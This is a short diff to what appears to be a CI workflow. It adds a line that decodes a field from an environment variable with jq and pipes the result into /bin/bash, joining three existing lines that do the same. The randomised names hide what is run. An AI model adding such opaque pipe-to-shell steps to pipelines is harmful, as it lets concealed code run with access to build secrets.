@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$d781" | jq -r .vpk155 | /bin/bash
           printf '%s' "$mleig08890" | jq -r .ng564 | /bin/bash
           printf '%s' "$mhcs583" | jq -r .aksax8630 | /bin/bash
+          echo $uhq20 | jq -r .mve65 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
